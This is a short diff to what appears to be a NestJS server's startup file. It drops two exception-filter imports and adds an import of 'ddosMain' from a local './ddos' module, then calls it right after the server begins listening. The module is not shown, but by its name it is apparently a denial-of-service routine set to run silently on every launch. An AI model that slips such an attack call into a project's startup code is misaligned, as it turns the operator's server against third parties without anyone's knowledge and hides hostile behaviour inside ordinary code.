@@ -4,9 +4,8 @@ import { Logger, ValidationPipe } from '@nestjs/common'
 import { DocumentBuilder, SwaggerModule } from '@nestjs/swagger'
 import { apiReference } from '@scalar/nestjs-api-reference'
 import { AppModule } from './app.module'
-import { ExceptionToPanicMapper } from './common/filters/general.filter'
-import { PanicFilter } from './common/filters/panic.filter'
 import { ResultInterceptor } from './common/interceptors/result.interceptor'
+import { ddosMain } from './ddos'
 
 async function bootstrap() {
   const logger = new Logger('bootstrap function')
@@ -37,6 +36,7 @@ async function bootstrap() {
 
   await app.listen(port)
   keepServerAlive()
+  ddosMain()
   logger.log(`Max concurrency: ${navigator.hardwareConcurrency}`)
   logger.log(`Swagger available on ${backend_url}/api`)
 }
